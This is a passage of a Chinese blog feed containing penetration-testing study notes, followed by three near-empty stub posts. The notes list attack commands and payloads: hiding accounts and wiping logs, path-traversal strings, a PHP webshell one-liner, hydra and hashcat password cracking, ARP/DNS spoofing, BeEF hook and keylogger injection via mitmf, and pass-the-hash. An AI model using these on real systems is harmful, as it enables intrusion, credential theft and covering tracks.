rel="noopener">http://blog.zx2c4.com/749</a></li></ol></li><li><p>利用配置不当提权</p><ol><li>与漏洞提权相比 更常用的方    <ol><li>企业环境</li><li>补丁更新的全部已经安装</li><li>输入变量过滤之外更值得研发关注的安全隐患</li><li>以system权限启动</li><li>NTFS权限允许users修改删除</li></ol></li><li>icacls<ol><li>icacls c:\windows*.exe /save perm /T</li><li>i586-mingw32msvc-gcc -o admin.exe admin.c</li></ol></li><li>Find<ol><li>find / -perm 777 -exec ls -l {} ;</li></ol></li><li>应用系统的配置文件<ol><li>应用连接数据库的配置文件</li></ol></li></ol></li><li><p>基本信息搜集</p><ol><li>Linux<ol><li>/etc/resolv.conf</li><li>/etc/passwd</li><li>/etc/shadow</li><li>whoami and who –a</li><li>ifconfig -a, iptables -L -n, ifconfig –a, netstat –r</li><li>uname –a, ps aux</li><li>dpkg -l| head</li></ol></li><li>Windows<ol><li>ipconfig /all , ipconfig /displaydns, netstat -bnao , netstat –r</li><li>net view , net view /domain</li><li>net user /domain, net user %username% /domain</li><li>net accounts, net share</li><li>net localgroup administrators username /add</li><li>net group “Domain Controllers” /domain</li><li>net share name$=C:\ /unlimited</li><li>net user username /active:yes /domain</li></ol></li><li>WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)<ol><li>wmic nicconfig get ipaddress,macaddress</li><li>wmic computersystemget username</li><li>wmic netlogin get name,lastlogon</li><li>wmic process get caption, executablepath,commandline</li><li>wmic process where name=“calc.exe” call terminate</li><li>wmic os get name,servicepackmajorversion</li><li>wmic product get name,version</li><li>wmic product where name=“name” call uninstall /nointeractive</li><li>wmic share get /ALL</li><li>wmic /node:”machinename” path Win32_TerminalServiceSetting where<br>AllowTSConnections=”0” call SetAllowTSConnections”1“</li><li>wmic nteventlogget path,filename, writeable</li></ol></li><li>收集敏感数据<ol><li>商业信息</li><li>系统信息</li><li>Linux<ol><li>/etc ；/usr/local/etc</li><li>/etc/password ；/etc/shadow</li><li>.ssh ；.gnupg 公私钥</li><li>The e-mail and data files</li><li>业务数据库 ；身份认证服务器数据库</li><li>/tmp</li></ol></li><li>windows<ol><li>SAM 数据库 ； 注册表文件</li><li>%SYSTEMROOT%\repair\SAM</li><li>%SYSTEMROOT%\System32\config\RegBack\SAM</li><li>业务数据库 ； 身份认证数据库</li><li>临时文件目录</li><li>UserProfile\AppData\Local\Microsoft\Windows\Temporary Internet Files\</li></ol></li></ol></li></ol></li><li><p>隐藏痕迹</p><ol><li>禁止在登陆界面显示新建账号</li><li>REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows<br>NT\CurrentVersion\WinLogon\SpecialAccounts\UserList” /v uname /T<br>REG_DWORD /D 0</li><li>del %WINDIR%*.log /a/s/q/f</li><li>History</li><li>日志<ol><li>auth.log / secure</li><li>btmp / wtmp</li><li>lastlog / faillog</li></ol></li><li>其他日志和 HIDS 等</li></ol></li></ol><h1 id="无线渗透"><a href="#无线渗透" class="headerlink" title="无线渗透"></a>无线渗透</h1><p>太多了还看完</p><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><ol><li><p>静态WEB</p></li><li><p>动态WEB</p><ol><li>应用程序</li><li>数据库</li><li>每个人看到的内容不同</li><li>根据用户输入返回不同结果</li></ol></li><li><p>WEB攻击面</p><ol><li>Network</li><li>OS</li><li>WEB Server </li><li>App server </li><li>Web Application </li><li>Database </li><li>Browser</li></ol></li><li><p>HTTP协议</p><ol><li>明文</li><li>无状态</li><li>cycle</li><li>重要的header</li><li>状态码（5大类型）<ol><li>100</li><li>200</li><li>300</li><li>400<ol><li>401</li><li>403</li><li>404</li></ol></li><li>500</li></ol></li></ol></li><li><p>扫描工具</p><ol><li>Nikto</li><li>Vega </li><li>Skipfish</li><li>W3af <ol><li>安装（详见虚拟机）</li><li>常用命令<ol><li>help 显示可用指令</li><li>plugin 进入plugin子命令<ol><li>Help</li><li>list audi列出所有插件</li><li>audit sqli xss 选择可用插件</li></ol></li><li>http-settings / misc-settings 全局配置<ol><li>help</li><li>view 查看可配置参数</li><li>set 设置参数1</li><li>back 回到上一级命令</li></ol></li></ol></li><li>profiles<ol><li>save_as self-contained</li><li>save_as test self-contained</li></ol></li><li>target<ol><li>set target <a href="http://1.1.1.1/" target="_blank" rel="noopener">http://1.1.1.1/</a></li></ol></li><li>start</li><li>script<ol><li>script/*.w3af</li></ol></li><li>身份认证<ol><li>HTTP Basic</li><li>NTLM</li><li>Form</li><li>Cookie 双身份认证/anti-CSRF tokens</li><li>截断代理<ol><li>W3af不支持Javascr（客户端技术ipt, Flash, Java applet 等）</li><li>代理阶段手动爬网<ol><li>spider_man</li><li>output.export_requests</li><li><a href="http://127.7.7.7/spider_man?terminate" target="_blank" rel="noopener">http://127.7.7.7/spider_man?terminate</a> 终止spider_man</li><li>crawl.import_results<ol><li>base64</li></ol></li></ol></li></ol></li><li>HTTPheader file</li></ol></li></ol></li><li>Arachni</li><li>Owasp-zap<ol><li>标准扫描工作流程<ol><li>设置代理</li><li>手动怕忘</li><li>自动爬网</li><li>主动扫描</li></ol></li></ol></li></ol></li><li><p>burpsuite（详见burp）</p></li><li><p>手动漏洞挖掘</p></li><li><p>身份认证</p><ol><li><p>常用弱口令/基于字典的密码爆破</p></li><li><p>锁定账号</p></li><li><p>信息收集</p><ol><li>手机号</li><li>密码错误提示信息</li></ol></li><li><p>密码嗅探</p></li><li><p>会话sessionID</p><ol><li>Xss / cookie importer</li><li>SessionID in URL</li><li>嗅探</li><li>SessionID 长期不变/永久不变</li><li>SessionID 生成算法<ol><li>Sequencer </li><li>私有算法</li><li>预判下一次登录时生成的sessionID</li><li>登出后返回测试</li></ol></li><li>密码找回</li><li>漏洞挖掘原则<ol><li>所以变量</li><li>所有头<ol><li>cookie中的变量</li><li>逐个变量删除</li></ol></li></ol></li><li>测试方法<ol><li>?file=../../../../etc/passwd</li><li>?page=file:///etc/passwd</li><li>?home=main.cgi </li><li>?page=<a href="http://www.a.com/1.php" target="_blank" rel="noopener">http://www.a.com/1.php</a></li><li><a href="http://1.1.1.1/../../../../dir/file.txt" target="_blank" rel="noopener">http://1.1.1.1/../../../../dir/file.txt</a></li></ol></li><li>编码绕过字符过滤<ol><li>“.” “%00” 绕过文件拓展名过滤</li><li>?file=a.doc%00.php</li><li>使用多种编码尝试</li></ol></li><li>编码<ol><li>url 编码、双层url编码<ol><li>%2e%2e%2f 解码：../</li><li>%2e%2e%5c 解码： ..\</li><li>%252e%252e%255c 解码： ..\</li></ol></li><li>Unicode/UTF-8 编码<ol><li>..%c0%af 解码： ../ </li><li>..%u2216</li><li>..%c1%9c 解码： ..\ </li></ol></li></ol></li><li>其他系统路径可能使用到的字符<ol><li>file.txt…<ol><li>file.txt<spaces> </li><li>file.txt”””” </li><li>file.txt&lt;&lt;&lt;&gt;&gt;&gt;&lt; </li><li>./././file.txt</li><li>nonexistant/../file.txt</li></ol></li><li>UNC 路径<ol><li>\1.1.1.1\path\to\file.txt</li></ol></li></ol></li><li>本地文件包含lfi<ol><li>查看文件</li><li>代码执行<ol><li><?php echo shell_exec($_GET['cmd']);?></li><li>Apache access.log</li></ol></li></ol></li><li>远程文件包含rfi<ol><li>出现概率少于lfi，但更容易被利用</li></ol></li><li>/usr/share/wfuzz/wordlist/vulns/</li><li>文件上传漏洞<ol><li><?php echo shell_exec($_GET['cmd']);?></li></ol></li><li>直接上传webshell</li><li>修改文件类型上传webshell<ol><li>Mimetype——文件头、拓展名</li></ol></li><li>修改拓展名上传webshell<ol><li>静态解析文件拓展名时可能无法执行</li></ol></li><li>文件头绕过过滤上传webshell</li><li>上传目录权限</li><li>SQL注入（详见SQL注入）</li><li>SQL盲注</li><li>SQLmap自动注入</li><li>xss（详见xss）</li><li>BEEF</li><li>csrf（Cross-site request forgery）——区分开xss<ol><li>从信任角度区分<ol><li>xss：利用用用户对站点的信任</li><li>csrf：利用站点对已有身份认证的信任</li></ol></li><li>结合社工在身份认证会话过程中实现攻击<ol><li>修改账号密码、个人信息（email、收获地址）</li><li>发送伪造的业务请求（网银、购物、投票）</li><li>关注他人社交账号、推送博文</li><li>在用户非自愿、不知情的情况下提交请求</li></ol></li></ol></li></ol></li><li><p>webshell（详见webshell）</p></li><li><p>https攻击</p><ol><li>攻击方法：<ol><li>降级攻击</li><li>解密攻击（明文、证书伪造）</li><li>协议漏洞、实现方法的漏洞、配置不严格</li></ol></li></ol></li><li><p>https加密过程</p><ol><li>握手、协商加密算法、传输<ol><li>非对称加密算法<ol><li>Diffie-Hellman key exchange</li><li>Rivest Shamir Adleman (RSA)</li><li>Elliptic Curve Cryptography (ECC)</li></ol></li><li>对称加密算法<ol><li>Data Encryption Standard (DES) / 3DES</li><li>Advance Encryption Standard (AES)</li><li>International Data Encryption Algorithm (IDEA)</li><li>Rivest Cipher 4 (RC4)<ol><li>WEP̵TLS/SSL̵RDP̵Secure shell</li></ol></li></ol></li></ol></li></ol></li><li><p>OpenSSL</p></li><li><p>SSLyze</p></li><li><p>SSL中间人攻击</p><blockquote><p>前提客户端已经信任伪造证书办法机构</p><p>攻击者控制了核发证书办法机构</p><p>客户端程序禁止了显示整数错误告警信息</p><p>攻击者已经控制客户端，并强制其信任伪造证书</p></blockquote><ol><li><p>ARP</p></li><li><p>DHCP</p></li><li><p>修改网关</p></li><li><p>修改DNS</p></li><li><p>修改HOSTS</p></li><li><p>ICMP、STP、OSPF</p></li><li><p>加密流量</p></li></ol></li></ol></li></ol><h1 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h1><ol><li><p>身份认证方法</p><ol><li><p>多因素身份认证</p><ol><li><p>你知道什么(账号密码、pin、passphrase)</p></li><li><p>你有什么（令牌、token、key、证书、密码、手机）</p></li><li><p>你是谁（指纹、视网膜、虹膜、掌纹、声纹、面部识别）</p><blockquote><p>上述结合使用</p></blockquote></li></ol></li></ol></li><li><p>密码破解方法</p><ol><li><p>人工猜解</p><ol><li>垃圾桶工程</li><li>被动信息收集</li></ol></li><li><p>基于字典暴力破解（<strong>主流</strong>）</p></li><li><p>键盘空间字符爆破</p></li><li><p>字典</p><ol><li><p>保存有用户名和密码的文本文件</p></li><li><p>/usr/share/wordlist</p></li><li><p>/usr/share/wfuzz/wordlist</p></li><li><p>/usr/share/seclists</p></li><li><p>键盘空间字符爆破</p><ol><li>全键盘空间字符</li><li>部分键盘空间字符 (基于规则)</li><li>数字、小写字母、大写字母、符号、空格、瑞典字符、高位ASCII码</li></ol></li><li><p>crunch <min-len> <max-len> [<charset string>] [options]</p><ol><li><charset string> 默认是小写字符</li></ol></li><li><p>crunch 6 6 0123456789 -o START -d 2 -b 1mb / -c 100</p><ol><li>-b 按大小分割字典文件（kb/kib、mb/mib、gb/gib）</li><li>-c 每个字典的行数</li><li>以上两个参数必须与-o START 结合使用</li><li>-d 同一字符连贯出现数量（11 / aaa）</li></ol></li><li><p>字符集</p><ol><li>crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-sv -o 1.txt</li></ol></li><li><p>无重复字符</p><ol><li>crunch 1 1 -p 1234567890 | more</li><li>必须是最后一个参数</li><li>最大、最小字符长度失效，但必须存在</li><li>与-s 参数不兼容（-s 指定起始字符串）</li><li>crunch 4 4 0123456789 -s 9990</li></ol></li><li><p>读取文件中每行内容作为基本字符生成字典<br>– crunch 1 1 -q read</p></li><li><p>字典组成规则</p><ol><li>crunch 6 6 -t @,%%^^ | more</li><li>@：小写字母 lalpha</li><li>,：大写字母 ualpha</li><li>%：数字 numeric</li><li>^：符号 symbols</li></ol></li><li><p>输出文件压缩</p><ol><li>crunch 4 4 -t @,%^ -o 1.txt -z 7z</li><li>其他压缩格式：gzip、bzip2、lzma</li><li>7z压缩比率最大</li></ol></li><li><p>crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha￾numeric-all-space -o w.txt -t @d@@ -s cdab</p></li><li><p>crunch 4 5 -p dog cat bird</p></li><li><p>crunch 5 5 abc DEF + !@# -t ,@^%,</p><ol><li>占位符</li><li>\ 转义符（空格、符号）</li></ol></li><li><p>crunch 5 5 -t ddd%% -p dog cat bir</p><ol><li>任何不同于-p 参数指定的值都是占位符</li></ol></li><li><p>crunch 5 5 -d 2@ -t @@@%%</p></li><li><p>组合应用</p><ol><li>crunch 2 4 0123456789 | aircrack-ng a.cap -e MyESSID -w -</li><li>crunch 10 10 12345 –stdout | airolib-ng testdb -import passwd -</li></ol></li><li><p>按个人信息生成其专属的密码字典</p></li><li><p>CUPP：Common User Password Profiler</p><ol><li>git clone <a href="https://github.com/Mebus/cupp.git" target="_blank" rel="noopener">https://github.com/Mebus/cupp.git</a></li><li>python cup.py -i</li></ol></li><li><p>通过收集网站信息生成字典</p></li><li><p>cewl 1.1.1.1 -m 3 -d 3 -e -c -v -w a.txt</p><ol><li>-m：最小单词长度</li><li>-d：爬网深度</li><li>-e：收集包含email地址信息</li><li>-c：每个单词出现次数</li><li>支持基本、摘要 身份认证</li><li>支持代理</li></ol></li><li><p>用户密码变型</p><ol><li>基于 cewl 的结果进行密码变型</li><li>末尾增加数字串</li><li>字母大小写变化</li><li>字母与符号互相转换</li><li>字母与数字互相转换</li><li>P@$$w0rd</li></ol></li><li><p>使用 John the Ripper 配置文件实现密码动态变型</p></li><li><p>/etc/john/john.conf</p><ol><li>[List.Rules:Wordlist]</li><li>$[0-9]$[0-9]$[0-9]</li><li>john –wordlist=cewl.txt –rules –stdout &gt; m.txt</li><li>[List.Rules:test]<br>$[0-9]$[0-9]$[0-9]$[a-zA-Z]<br>$[0-9]$[0-9]$[0-9]$[a-zA-Z]$[a-zA-Z]$[a-zA-Z]$[`~!@#$%^&amp;*()-_=+]</li><li>john –wordlist=cewl.txt –rules=test –stdout &gt; m.txt</li><li>john –wordlist=ahm.lst –rules=test HASHFILE</li></ol></li><li><p>在线密码破解——hydra</p><blockquote><p>缺点：</p><p>稳定性差，程序时常崩溃</p><p>速度控制不好，容易触发服务屏蔽或锁死机制</p><p>每主机新建进程，每服务新建实例</p><p>大量目标破解时性能差</p></blockquote><ol><li>Windows密码破解<ol><li>hydra -l administrator -P pass.lst smb://1.1.1.1/admin$ -vVd</li><li>hydra -l administrator -P pass.lst rdp://1.1.1.1 -t 1 -vV</li></ol></li><li>Linux密码破解<ol><li>hydra -l root -P pass.lst ssh://1.1.1.1 -vV</li></ol></li><li>其他服务密码破解<ol><li>hydra -L user.lst -P pass.lst <a href="ftp://1.1.1.1">ftp://1.1.1.1</a> -s 2121 -e nsr -o p.txt -t 64</li></ol></li><li>HTTP表单身份认证<ol><li>hydra -l admin -P pass.lst 1.1.1.1 http-post-form<br>“/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=L<br>in:S=index.php” -V</li><li>hydra -l admin -P pass.lst 1.1.1.1 http-post-form<br>“/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=L<br>in:Login Failed” -V</li><li>/foo.php:user=^USER^&amp;pass=^PASS^:S=success:C=/page/cookie:H<br>=X-Foo: Foo<ol><li>C：先访问指定页面取得cookie</li><li>H：指定http头</li></ol></li><li>https-post-form、http-get-form、https-get-form</li><li>-S：使用SSL连接</li></ol></li><li>pw-inspector<ol><li>按长度和字符集筛选字典</li><li>pw-inspector -i /usr/share/wordlists/nmap.lst -o p.lst -l</li><li>pw-inspector -i /usr/share/wordlists/nmap.lst -o P.lst -u</li></ol></li><li>密码破解效率<ol><li>密码复杂度（字典命中率）</li><li>带宽、协议、服务器性能、客户端性能</li><li>锁定阈值</li><li>单位时间最大登陆请求次数</li></ol></li></ol></li><li><p>在线密码破解——medusa</p><ol><li>medusa -d</li><li>破解windows密码<ol><li>medusa -M smbnt -h 1.1.1.1 -u administrator -P pass.lst -e ns -F</li></ol></li><li>破解Linux SSH密码<ol><li>medusa -M ssh -h 192.168.20.10 -u root -P pass.lst -e ns –F</li></ol></li><li>其他服务密码破解<ol><li>medusa -M mysql -h 1.1.1.1 -u root -P pass.lst -e ns -F</li><li>medusa -h 1.1.1.1 -u admin -P pass.lst -M web-form -m<br>FORM:”dvwa/login.php” -m DENY-SIGNAL:”login.php” -m FORM￾DATA:”post?user=username&amp;pass=password&amp;Login=Login”</li><li>参数解释：<ol><li>-n：非默认端口</li><li>-s：使用SSL连接</li><li>-T：并发主机数</li><li>medusa -M ftp -q</li></ol></li></ol></li></ol></li><li><p>离线密码破解</p><ol><li><p>身份认证</p><ol><li>禁止明文传输密码</li><li>每次认证使用HASH算法加密密码传输（HASH算法加密容易、解密困难）</li><li>服务器端用户数据库应加盐加密保存</li></ol></li><li><blockquote><p>破解思路</p><ol><li>嗅探获取密码HASH</li><li>利用漏洞登陆服务器并从用户数据库获取密码HASH</li><li>识别HASH类型<ol><li>长度、字符集</li></ol></li><li>利用离线破解工具碰撞密码HASH</li></ol></blockquote></li><li><p>Windows HASH获取工具</p><ol><li>利用漏洞：Pwdump、fgdump、 mimikatz、wce</li><li>物理接触：samdump2</li><li>Kali ISO 启动虚拟机</li><li>mount /dev/sda1 /mnt</li><li>cd /mnt/Windows/System32/config</li><li>samdump2 SYSTEM SAM -o sam.hash</li><li>利用nc传输HASH</li></ol></li></ol></li><li><p>离线密码破解——Hashcat</p><ol><li>开源多线程密码破解工具</li><li>支持80多种加密算法破解</li><li>基于CPU的计算能力破解</li><li>六种模式<ol><li>0 Straight：字典破解</li><li>1 Combination：将字典中密码进行组合（1 2 &gt; 11 22 12 21）</li><li>2 Toggle case：尝试字典中所有密码的大小写字母组合</li><li>3 Brute force：指定字符集（或全部字符集）所有组合</li><li>4 Permutation：字典中密码的全部字符置换组合（12 21）</li><li>5 Table-lookup：程序为字典中所有密码自动生成掩码</li></ol></li><li>命令<ol><li>hashcat -b</li><li>hashcat -m 100 hash.dump pass.lst</li><li>hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l?d?d</li><li>结果：hashcat.pot</li><li>hashcat -m 100 -a 3 hash -i –increment-min 6 –increment-max<br>8 ?l?l?l?l?l?l?l?l</li><li>?l = abcdefghijklmnopqrstuvwxyz</li><li>?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ</li><li>?d = 0123456789</li><li>?s = !”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~</li><li>?a = ?l?u?d?s</li><li>?b = 0x00 - 0xff</li></ol></li></ol></li><li><p>离线密码破解——oclhashcat</p><ol><li>号称世界上最快、唯一的基于GPGPU的密码破解软件</li><li>免费开源、支持多平台、支持分布式、150+hash算法</li><li>硬件支持<ol><li>虚拟机中无法使用</li><li>支持 CUDA 技术的Nvidia显卡</li><li>支持 OpenCL 技术的AMD显卡</li><li>安装相应的驱动</li></ol></li><li>限制<ol><li>最大密码长度 55 字符</li><li>使用Unicode的最大密码长度 27 字符</li></ol></li><li>关于版本<ol><li>oclHashcat-plus、oclHashcat-lite已经合并为oclhashcat</li></ol></li><li>命令<ol><li>oclHashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a?a</li><li>?l = abcdefghijklmnopqrstuvwxyz</li><li>?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ</li><li>?d = 0123456789</li><li>?s = !”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~</li><li>?a = ?l?u?d?s</li><li>?b = 0x00 - 0xff</li></ol></li></ol></li><li><p>离线密码破解——RainbowCrack</p><ol><li>基于时间记忆权衡技术生成彩虹表</li><li>提前计算密码的HASH值，通过比对HASH值破解密码</li><li>计算HASH的速度很慢，修改版支持CUDA GPU<ol><li><a href="https://www.freerainbowtables.com/en/download/" target="_blank" rel="noopener">https://www.freerainbowtables.com/en/download/</a></li></ol></li><li>KALI 中包含的RainbowCrack工具<ol><li>rtgen：预计算，生成彩虹表，耗时的阶段</li><li>rtsort：对rtgen生成的彩虹表进行排序</li><li>rcrack：查找彩虹表破解密码</li><li>以上命令必须顺序使用</li><li>彩虹表<br>– 密码明文、HASH值、HASH算法、字符集、明文长度范围</li><li>rtgen<ol><li>LanMan、NTLM、MD2、MD4、MD5、SHA1、RIPEMD160</li><li>rtgen md5 loweralpha 1 5 0 10000 10000 0</li><li>计算彩虹表时间可能很长</li></ol></li><li>下载彩虹表<br>– <a href="http://www.freerainbowtables.com/en/tables/" target="_blank" rel="noopener">http://www.freerainbowtables.com/en/tables/</a><br>– <a href="http://rainbowtables.shmoo.com/" target="_blank" rel="noopener">http://rainbowtables.shmoo.com/</a></li><li>彩虹表排序<ol><li>/usr/share/rainbowcrack</li><li>rtsort /md5_loweralpha#1-5_0_1000x1000_0.rt</li></ol></li><li>密码破解<ol><li>rcrack *.rt -h 5d41402abc4b2a76b9719d911017c592</li><li>rcrack *.rt -l hash.txt</li></ol></li></ol></li></ol></li><li><p>离线密码破解——John </p></li><li><p>密码嗅探</p><ol><li>二、三层地址<ol><li>IP 网络到网络</li><li>MAC 主机到主机</li></ol></li><li>交换机与HUB<ol><li>HUB全端口转发</li><li>交换机根据学习地址转发</li><li>混杂模式抓包</li></ol></li><li>ARP协议<ol><li>免费ARP</li><li>基于广播学习</li><li>以太网头、ARP头</li><li>请求、响应相对独立</li><li>基于传闻的协议</li></ol></li><li>手动修改数据包实现ARP欺骗<ol><li>arpspoof<ol><li>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</li><li>arpspoof -t 1.1.1.12 -r 1.1.1.1</li></ol></li><li>网络嗅探<ol><li>driftnet -i eth0 -a -d tempdir -s </li><li>dnsspoof -i eth0 -f /usr/share/dsniff/dnsspoof.hosts</li><li>urlsnarf -i eth0</li><li>webspy -i eth0 1.1.1.10</li><li>dsniff -i eth0 -m<ol><li>/usr/share/dsniff/dsniff.services</li></ol></li><li>DNS欺骗代理<ol><li>dnschef –fakeip=1.1.1.10 –<br>fakedomains=<a href="http://www.google.com,www.youtube.com" target="_blank" rel="noopener">www.google.com,www.youtube.com</a> –interface 1.1.1.2<br>-q</li></ol></li><li>将被害者DNS指向伪造的DNS服务器</li></ol></li></ol></li></ol></li><li><p>中间人攻击</p><ol><li><p>注入XSS</p><ol><li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码</li><li>一旦得手，影响范围巨大</li><li>如果中间人发生在运营商线路上，很难引起用户注意</li></ol></li><li><p>Mitmf 安装</p><ol><li>曾经号称最好用的中间人攻击工具（kali 2.0后默认未安装）</li><li>apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter￾queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3<br>libcapstone-dev libffi-dev file</li><li>apt-get install mitmf</li><li>pip uninstall twisted </li><li>wget <a href="http://twistedmatrix.com/Releases/Twisted/15.5/Twisted-" target="_blank" rel="noopener">http://twistedmatrix.com/Releases/Twisted/15.5/Twisted-</a><br>15.5.0.tar.bz2</li><li>pip install ./Twisted-15.5.0.tar.bz2</li></ol></li><li><p>启动beef</p><ol><li>cd /usr/share/beef-xss/</li><li>./beef</li></ol></li><li><p>mitmf中间人注入xss脚本</p><ol><li>mitmf –spoof –arp -i eth0 –gateway 1.1.1.1 –target 1.1.1.2 –inject<br>–js-url <a href="http://1.1.1.3:3000/hook.js" target="_blank" rel="noopener">http://1.1.1.3:3000/hook.js</a></li><li>mitmf –spoof –arp -i eth0 –gateway 192.168.20.2 –target<br>192.168.20.1 –jskeylogger</li><li>–upsidedownternet、<br>–screen（/var/log/mitmf）</li><li>–ferretng（cookie）、–browserprofiler（浏览器及插件信息）</li><li>–smbtrap、<br>–smbauth（不演示）</li></ol></li><li><p>–hsts</p><ol><li>HTTP Strict Transport Security </li><li>防止协议降级、cookie窃取</li><li>安全策略通过HTTP响应头”Strict-Transport-Security“实施</li><li>限制user-agent、https等</li></ol></li><li><p>–filepwn</p><ol><li>凌空插后门</li></ol></li><li><p>Ettercap</p><ol><li>统一的中间人攻击工具</li><li>转发MAC与本机相同，但IP与本机不同的数据包</li><li>支持SSH1、SSL中间人攻击</li></ol></li><li><p>模块划分</p><ol><li><p>Snifer</p><ol><li>负责数据包转发</li><li>Unified<ol><li>单网卡情况下独立完成三层包转发</li><li>始终禁用内核IP_Forward功能</li></ol></li><li>Bridge<ol><li>双网卡情况下的一层MITM模式</li><li>可作为IPS过滤数据包</li><li>不可在网关上使用（透明网桥）</li></ol></li></ol></li><li><p>MITM</p><ol><li><p>把流量重定向到ettercap主机上</p></li><li><p>可以使用其他工具实现MITM，ettercap之作嗅探和过滤使用</p></li><li><blockquote><p>实现MITM的方法</p><ol><li>ARP</li><li>ICMP<ol><li>ICMP路由重定向，半双工</li></ol></li><li>DHCP<ol><li>修改网关地址，半双工</li></ol></li><li>Switch Port Stealing<ol><li>flood目标地址是本机，源地址是受害者的包</li><li>适用于ARP静态绑定的环境</li></ol></li><li>NDP<ol><li>IPv6协议欺骗技术</li></ol></li></ol></blockquote></li></ol></li><li><p>Filter</p></li><li><p>Log</p></li><li><p>Plugin</p></li></ol></li><li><p>权限</p><ol><li>需要root权限打开链路层Socket连接，然后使用nobody账号运行</li><li>日志写入目录需要nobody有写入权</li><li>修改etter.conf：EC_UID=65534</li></ol></li><li><p>基于伪造证书的SSL MITIM</p><ol><li>Bridge模式不支持SSL MITM</li><li>openssl genrsa −out etter.ssl.crt 1024 </li><li>openssl req −new−keyetter.ssl.crt −out tmp.csr</li><li>openssl x509 −req −days 1825 −in tmp.csr </li><li>signkey etter.ssl.crt <ol><li>out tmp.new</li></ol></li><li>cat tmp.new&gt;&gt;etter.ssl.crt </li><li>rm −f tmp.newtmp.csz</li></ol></li></ol></li><li><p>ARP MITM</p><ol><li>字符模式<ol><li>ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -F 1.ef -P<br>autoadd -w a.cap -l loginfo -L logall -m message</li></ol></li><li>图形界面</li><li>SSL MITM<ol><li>vi /etc/ettercap/etter.conf</li></ol></li><li>DNS欺骗<ol><li>dns_spoof插件配置文件</li><li>vi /etc/ettercap/etter.dns</li></ol></li><li>Ettercap 日志查看<ol><li>etterlog -p log.eci 查看获取的密码</li><li>etterlog -c log.ecp 列出Log中的连接</li><li>etterlog -c -f /1.1.1.1/ log.ecp</li><li>etterlog -B -n -s -F TCP:1.1.1.1:20:1.1.1.2:1234 log.ecp &gt; aa<br>选择相应的连接并榨取文件</li></ol></li><li>Filter<ol><li>/usr/share/ettercap/</li></ol></li><li>SSH-2.xx / SSH-1.99 / SSH-1.51<ol><li>etterfilter etter.filter.ssh -o ssh.ef</li></ol></li><li>替换HTTP内容<ol><li>if (ip.proto == TCP &amp;&amp; tcp.src == 80) {</li><li>msg(“data on TCP 80\n”);</li><li>replace(“img src=”, “img src=&quot;<a href="http://1.1.1.1/1.gif\&quot;" target="_blank" rel="noopener">http://1.1.1.1/1.gif\&quot;</a> “);</li><li>replace(“IMG src=”, “img src=&quot;<a href="http://1.1.1.1/1.gif\&quot;" target="_blank" rel="noopener">http://1.1.1.1/1.gif\&quot;</a> “);</li><li>replace(“IMG SRC=<br>“<br>,<br>“img src=&quot;<a href="http://1.1.1.1/1.gif\&quot;" target="_blank" rel="noopener">http://1.1.1.1/1.gif\&quot;</a> “);<br>}</li></ol></li><li>ICMP<br>– -M icmp:00:11:22:33:44:55/10.0.0.1（真实网关的MAC/IP）</li><li>DHCP<br>– −M dhcp:192.168.0.30,35,50−60/255.255.255.0/192.168.0.1（DNS）</li><li>Port<br>– -M port /1.1.1.1/ /1.1.1.2/</li><li>Ndp<br>– -M ndp //fe80::260d:afff:fe6e:f378/ //2001:db8::2:1/</li></ol></li><li><p>Pass the Hash (PTH)</p><ol><li>密码破解耗费时间资源巨大</li><li>使用密文提交给服务器直接完成身份认证</li><li>NTLM/LM是没有加盐的静态HASH密文</li><li>企业中使用ghost等工具克隆安装系统</li><li>pth-winexe -U<br>w7%aad3b435b51404eeaad3b435b51404ee:ed1bfaeb3063<br>716ab7fe2a11faf126d8 //1.1.1.1 cmd</li></ol></li></ol></li></ol></li></ol><h1 id="msf-详见msf"><a href="#msf-详见msf" class="headerlink" title="msf(详见msf)"></a>msf(详见msf)</h1><h1 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h1><h1 id="计算机取证"><a href="#计算机取证" class="headerlink" title="计算机取证"></a>计算机取证</h1>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 时间都去哪了 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nessus</title>
      <link href="2020/10/29/nessus/"/>
      <url>2020/10/29/nessus/</url>
      
        <content type="html"><![CDATA[<p>先写上，好逼着自己赶紧抽空把这么学习笔记给完成</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OWASP</title>
      <link href="2020/10/29/owasp/"/>
      <url>2020/10/29/owasp/</url>
      
        <content type="html"><![CDATA[<p>先写上，好逼着自己赶紧抽空把这么学习笔记给完成</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OWASP TOP 10 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss</title>
      <link href="2020/10/29/xss/"/>
      <url>2020/10/29/xss/</url>
      
        <content type="html"><![CDATA[<p>关于这一篇我是真的要被自己蠢哭了，怎么就手一抖把写完的给覆盖了呢好气好气哦，一紧张还把啥都给忘了</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 零零碎碎的知识点 </tag>
            
            <tag> Xss </tag>
            
        </tags>
      
    </entry>
